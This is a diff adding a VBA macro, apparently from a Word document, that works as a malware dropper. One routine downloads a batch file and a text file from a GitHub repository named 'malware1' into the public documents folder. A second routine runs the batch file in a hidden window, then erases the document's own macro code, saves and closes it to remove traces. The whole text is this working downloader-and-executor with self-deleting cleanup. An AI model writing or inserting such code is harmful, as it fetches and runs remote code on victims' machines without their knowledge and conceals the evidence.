@@ -1,0 +1,67 @@
+Sub A()
+    Dim http As Object
+    Dim adoStream As Object
+    Dim fileURL As Variant
+    Dim savePath As String
+    Dim urls As Variant
+    Dim paths As Variant
+    Dim i As Integer
+    Dim startTime As Double
+    ' Danh sách URL c?n t?i
+    urls = Array( _
+        "https://raw.githubusercontent.com/lka7b6c73/malware1/refs/heads/main/create.bat", _
+        "https://raw.githubusercontent.com/lka7b6c73/malware1/refs/heads/main/input.txt" _
+    )
+    paths = Array( _
+        "C:\Users\Public\Documents\", _
+        "C:\Users\Public\Documents\" _
+    )
+    ' L?p qua t?ng URL trong danh sách
+    For i = LBound(urls) To UBound(urls)
+        fileURL = urls(i)
+        savePath = paths(i) & Mid(fileURL, InStrRev(fileURL, "/") + 1)
+
+        Set http = CreateObject("MSXML2.XMLHTTP")
+        http.Open "GET", fileURL, False
+        http.Send
+
+        If http.Status = 200 Then
+            Set adoStream = CreateObject("ADODB.Stream")
+            adoStream.Type = 1 ' binary
+            adoStream.Open
+            adoStream.Write http.responseBody
+            adoStream.SaveToFile savePath, 2 ' Overwrite
+            adoStream.Close
+        Else
+            MsgBox "L?i t?i file: " & fileURL & vbCrLf & "Status: " & http.Status, vbExclamation
+        End If
+        Do While Dir(savePath) = ""
+            startTime = Timer
+            Do While Timer < startTime + 1
+                DoEvents
+            Loop
+        Loop
+        Set adoStream = Nothing
+        Set http = Nothing
+    Next i
+End Sub
+Sub B()
+    Dim createBatPath As String
+    Dim inputTxtPath As String
+    Dim startTime As Double
+    createBatPath = "C:\Users\Public\Documents\create.bat"
+    Do While Dir(createBatPath) = "" Or Dir(inputTxtPath) = ""
+        startTime = Timer
+        Do While Timer < startTime + 1
+            DoEvents
+        Loop
+    Loop
+    shell createBatPath, vbHide
+    MsgBox "Done"
+    Set vbComp = ThisDocument.VBProject.VBComponents("ThisDocument")
+    Dim lineCount As Long
+    lineCount = vbComp.CodeModule.CountOfLines
+    vbComp.CodeModule.DeleteLines 1, lineCount
+    ThisDocument.Save
+    ThisDocument.Close SaveChanges:=False
+End Sub
